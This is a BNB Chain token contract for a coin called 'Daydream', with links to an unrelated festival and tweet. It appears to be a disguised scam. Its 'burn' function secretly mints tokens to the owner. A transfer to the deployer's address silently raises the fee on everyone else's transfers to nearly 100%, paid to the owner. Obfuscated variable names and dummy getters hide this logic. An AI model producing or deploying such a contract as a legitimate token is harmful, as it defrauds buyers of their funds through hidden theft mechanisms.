/**
 *Submitted for verification at BscScan.com on 2022-11-19
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-19 13:15 GMT
 */
//https://www.daydreamfestival.qa/
//https://twitter.com/VirginMENA/status/1585171880729886720
//https://t.co/1rU2k2WUZc

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract AZVZUMF {
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  SVGJYE = address(0);
uint256 private  VGIZKQ = 1000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  QVDISV = 100000000;
uint256 private  IDABMZ = 1000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  NUFYKU = 10000000000000;
address public owner;
address private  DMJLKG = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  BOXQZD = 1000000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant LCZBMP = 99999;
address private  DKYIQX = address(0);
address private  ALMFJV = address(0);
string public  symbol = "Daydream";
uint256 private  YNGVOH = 10000000000;
uint256 private  ZOGMPA = 1000000000000000000;
string public  name = "Daydream";
uint8 public constant decimals = 18;
mapping (address => uint256) public balanceOf;
address private  PVJONJ = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "WBQTYK");
require(to != address(0), "WBQTYK");
require(amount <= balanceOf[from], "WBQTYK");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* LCZBMP/ZOGMPA ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==PVJONJ){
ZOGMPA = LCZBMP+2;
}
emit Transfer(from, to, transferAmount);
}
function _getBOXQZD() private returns (uint256) {
return BOXQZD;
}

function _getDKYIQX() private returns (address) {
return DKYIQX;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getYNGVOH() private returns (uint256) {
return YNGVOH;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getSVGJYE() private returns (address) {
return SVGJYE;
}

function _getALMFJV() private returns (address) {
return ALMFJV;
}

function _getDMJLKG() private returns (address) {
return DMJLKG;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getQVDISV() private returns (uint256) {
return QVDISV;
}

function _getVGIZKQ() private returns (uint256) {
return VGIZKQ;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getIDABMZ() private returns (uint256) {
return IDABMZ;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tWBQTYK 0");
require(spender != address(0), "fWBQTYK 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getNUFYKU() private returns (uint256) {
return NUFYKU;
}

constructor () {
PVJONJ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

}